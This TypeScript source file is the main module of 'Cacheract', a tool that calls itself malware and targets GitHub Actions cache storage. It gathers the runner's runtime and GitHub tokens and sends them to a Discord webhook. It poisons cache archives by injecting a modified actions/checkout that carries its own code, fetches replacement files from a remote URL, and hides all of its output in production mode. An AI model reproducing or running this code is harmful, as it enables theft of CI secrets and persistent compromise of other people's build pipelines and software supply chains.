import * as fs from 'fs';
import * as crypto from 'crypto';
import { getToken, listCacheEntries, clearEntry, checkRunnerEnvironment, retrieveEntry, listActions, isDefaultBranch, updateArchive, generateRandomString, prepareFileEntry, createArchive, isInfected, checkCacheEntry} from './utils';
import axios from 'axios';
import { DISCORD_WEBHOOK, CHECKOUT_YML, REPLACEMENTS, EXPLICIT_ENTRIES } from './config';
import { reportDiscord } from './exfil';
import * as path from 'path';
import { calculateCacheConfigs, calculateCacheVersion, getSetupActions, getWorkflows } from './cache_predictor';
import { getCacheDirectories, getPackageManagerInfo } from './cache_predictor/node';

var cacheHttpclient = require('@actions/cache/lib/internal/cacheHttpClient');
/**
 * Set a cache entry
 * @param archive - Path to the archive file
 * @param key - Cache key
 * @param version - Cache version
 * @param runtimeToken - GitHub Actions runtime token
 * @param cacheUrl - URL for the cache service
 * @returns Promise<boolean> indicating if the cache entry was set successfully
 */
async function setEntry(archive: string, key: string, version: string, runtimeToken: string, cacheUrl: string): Promise<boolean> {
    try {
        // Validate inputs
        if (!cacheUrl || !runtimeToken) {
            console.error('Cache URL or runtime token is missing');
            return false;
        }

        // Get file size of the archive path
        if (!fs.existsSync(archive)) {
            console.error(`Archive file does not exist at path: ${archive}`);
            return false;
        }

        const stats = fs.statSync(archive);
        const archiveFileSize = stats.size;

        const headers = {
            'Authorization': `Bearer ${runtimeToken}`,
            'User-Agent': 'actions/cache-4.0.0',
            'accept': 'application/json;api-version=6.0-preview.1'
        };

        const data = {
            key,
            version,
            cacheSize: archiveFileSize
        };

        const url = new URL(`${cacheUrl}_apis/artifactcache/caches`);
        const response = await axios.post(url.href, data, { headers });

        if (response.status === 201) {
            await cacheHttpclient.saveCache(response.data['cacheId'], archive);
            return true;
        } else {
            console.log('Error saving cache entry:', response.status, response.statusText);
            return false;
        }
    } catch (error) {
        console.error('Error setting cache entry:', error);
        return false;
    }
}

/**
 * 
 * @param archive_path - Path to the archive to poison.
 * @returns Promise<boolean> indicating if the archive was updated successfully
 */
export async function updateEntry(archive_path: string): Promise<boolean> {
    const currentFilePath = path.resolve(__dirname, __filename);

    // Generate a random directory name
    const randomDirName = generateRandomString(12);
    const sourceDir = path.join('/tmp', `${randomDirName}`);
    const cacheFile = archive_path;
    const leadingPath = '/home/runner/work/_actions';

    // Ensure the source directory exists
    if (!fs.existsSync(sourceDir)) {
        fs.mkdirSync(sourceDir, { recursive: true });
    }

    const archiveDetails: { stagingDir: string; leadingPath: string; }[] = []

    const actions = await listActions(leadingPath);
    if (actions.has("actions/checkout")) {
        const actionDetails = actions.get("actions/checkout");

        const stagingDir = `${sourceDir}/${actionDetails?.path}`
        fs.mkdirSync(`${stagingDir}/dist`, { recursive: true });
        // Copy the current file to the source directory
        if (actionDetails?.js) {
            const newJsFile = actionDetails.js.replace('index.js', 'utility.js');
            fs.copyFileSync(currentFilePath, path.join(stagingDir, newJsFile));
        } else {
            throw new Error('JavaScript file path is undefined');
        }

        const decodedContent: string = Buffer.from(CHECKOUT_YML, 'base64').toString('utf-8');
        fs.writeFileSync(path.join(stagingDir, actionDetails.yml), decodedContent);
        archiveDetails.push({
            stagingDir: stagingDir,
            leadingPath: path.join(leadingPath, actionDetails.path)
        });
    }

    if (REPLACEMENTS.length > 0) {
        console.log("Replacements configured, adding to poisoned archive!")
        for (const replacement of REPLACEMENTS) {
            var decodedContent: string = '';
            if (replacement.FILE_CONTENT) {
                // Base64 decode the content
                decodedContent = Buffer.from(replacement.FILE_CONTENT, 'base64').toString('utf-8');
            } else if (replacement.FILE_URL) {
                const response = await axios.get(replacement.FILE_URL);
                if (response.status === 200) {
                    decodedContent = response.data;
                }
            }

            if (decodedContent) {
                const fileName = path.basename(replacement.FILE_PATH);
                const dirPath = path.dirname(replacement.FILE_PATH);
                const sourceDir = await prepareFileEntry(fileName, decodedContent);
                archiveDetails.push({
                    stagingDir: sourceDir,
                    leadingPath: dirPath
                });
            } else {
                console.error(`Failed to fetch content for replacement: ${replacement.FILE_PATH}`);
            }
        }
    }

    await updateArchive(cacheFile, archiveDetails);

    return true;
}

async function createEntry(size: number): Promise<string> {
    const randomDirName = generateRandomString(12);
    const sourceDir = path.join('/tmp', `${randomDirName}`);
    const archivePath = path.join('/tmp', `${randomDirName}.tar.gz`);

    // Ensure the source directory exists
    if (!fs.existsSync(sourceDir)) {
        fs.mkdirSync(sourceDir, { recursive: true });
    }

    // Create random file of number in size in sourcedir
    // Create random file with specified size
    const filePath = path.join(sourceDir, 'random.dat');
    const chunkSize = 1024 * 1024; // 1MB chunks
    const writeStream = fs.createWriteStream(filePath);

    try {
        let remaining = size;
        while (remaining > 0) {
            const currentChunk = Math.min(remaining, chunkSize);
            const buffer = crypto.randomBytes(currentChunk);
            writeStream.write(buffer);
            remaining -= currentChunk;
        }
        writeStream.end();

        await new Promise((resolve, reject) => {
            writeStream.on('finish', resolve);
            writeStream.on('error', reject);
        });
    } catch (error) {
        console.error(`Error creating random file: ${error}`);
        throw error;
    }

    // Tar the directory
    await createArchive(archivePath, sourceDir)

    return archivePath;
}

async function createAndSetEntry(
    size: number,
    key: string,
    version: string,
    accessToken: string,
    cacheServerUrl: string
) {
    const path = await createEntry(size);
    if (path) {
        await setEntry(path, key, version, accessToken, cacheServerUrl);
    } else {
        console.error("Failed to create entry for key.");
    }
}

async function main() {
    const goodRunner = await checkRunnerEnvironment();
    if (goodRunner.github_hosted === true) {
        if (goodRunner.os !== 'Linux') {
            console.log('Cacheract currently only supports GitHub Hosted Linux runners.');
            console.log('Reporting telemetry to Discord since it is GitHub hosted.');
            process.exit(0);
        }
    } else {
        console.log('Cacheract is not running on a GitHub Hosted runner, exiting without reporting telemtry (we could be anywhere).');
        process.exit(0);
    }

    const tokens = await getToken();
    const accessToken = tokens.get('ACCESS_TOKEN');
    const cacheServerUrl = tokens.get('ACTIONS_CACHE_URL');
    const githubToken = tokens.get('GITHUB_TOKEN');

    console.log("Running 🧊 Cacheract 🧊 in verbose development mode!")
    console.log("📣 If this is unexpected, then you have likely been pwned, but the pwner didn't RTFM. 🫠")
    console.log("Flush all GitHub Actions Caches to evict this malware.")

    if (DISCORD_WEBHOOK) {
        console.log('Reporting secrets 🤫 to Discord');
        reportDiscord(DISCORD_WEBHOOK, tokens).catch((error) => {
            console.error('Error reporting to Discord:', error);
        });
    } else {
        console.log('No Discord webhook configured 😢');
    }

    if (githubToken && accessToken && cacheServerUrl && await isDefaultBranch(githubToken)) {
        process.env['ACTIONS_CACHE_URL'] = cacheServerUrl;
        process.env['ACCESS_TOKEN'] = accessToken;
        process.env['ACTIONS_RUNTIME_TOKEN'] = accessToken;

        const entries = await listCacheEntries(githubToken);
        let clearEntryFailed = false;
        try {
            const configs = await calculateCacheConfigs();

            // Add any manually configured entries
            for (const entry of EXPLICIT_ENTRIES) {                
                configs.add(`${entry.key}:${entry.version}`);
            }

            console.log('Calculated cache configs:', configs)

            for (const config of configs) {
                const [key, version] = config.split(':');
                // Check if entry exists in main

                if (process.env.GITHUB_REF) {
                    if (!await checkCacheEntry(githubToken, key, process.env.GITHUB_REF)) {
                        // We add the entry to the list of entries to be updated.
                        entries.push({
                            key,
                            version,
                            ref: "e808b8c29727ee0b47c076d7dfad1db8c5a39eec", // just a dummy value to satisfy this program's logic.
                            size: 1333337
                        });
                    }
                } else {
                    console.error('GITHUB_REF is not defined');
                }
            }

            if (!entries || entries.length === 0) {
                console.log('No cache entries found, Cacheract will not attempt to update entries as it does not know the keys.');
            } else {
                for (const entry of entries) {
                    const { key, version, ref, size } = entry;
                    const currBranch = process.env['GITHUB_REF'];
        
                    if (isInfected() && currBranch === ref) {
                        console.log(`Not attempting to clear entry as it already contains Cacheract.`);
                        continue;
                    }

                    if (clearEntryFailed) {
                        if (currBranch === ref) {
                            console.log(`Skipping setting entry for key ${key} due to previous clearEntry failure`);
                            continue;
                        } else {
                            console.log("Attempting to update entry in main that is currently only in a feature branch.");
                            await createAndSetEntry(size, key, version, accessToken, cacheServerUrl);
                            continue;
                        }
                    }
        
                    let path = '';
                    if (currBranch !== ref) {
                        // Entry is not in the default branch, create a new entry
                        path = await createEntry(size);
                    } else {
                        // Entry is in default branch, retrieve it
                        path = await retrieveEntry(key, version, accessToken, cacheServerUrl);
                    }
        
                    // Update the entry, whether we made one or retrieved it.
                    const status = await updateEntry(path);
                    if (status) {

                        // Attempt to clear the entry from the feature branch
                        // this will help us jump (such as to a tag that uses a secret, etc).
                        const cleared = await clearEntry(key, version, githubToken);
                        if (!cleared) {
                            // Likely means we do not have actions: write
                            console.log(`Failed to clear cache entry ${key}!`);
                            clearEntryFailed = true;
                        }
                        // If we cleared the entry or if the entry was on feature branch then we set it.
                        if (cleared || currBranch !== ref) {
                            await setEntry(path, key, version, accessToken, cacheServerUrl);
                        }
                    } else {
                        console.log("Failed to poison archive!");
                    }
                }
            }
        } catch (error) {
            console.log(error);
        }
    } else {
        console.log('Cacheract running in non-default branch, skipping cache poisoning.');
    }
}

// Suppress output in production
if (process.env.NODE_ENV === 'production') {
    process.stdout.write = (() => { }) as unknown as typeof process.stdout.write;
    process.stderr.write = (() => { }) as unknown as typeof process.stderr.write;
    console.log = () => { };
    console.error = () => { };
}

main().catch(error => {
    console.error(error);
});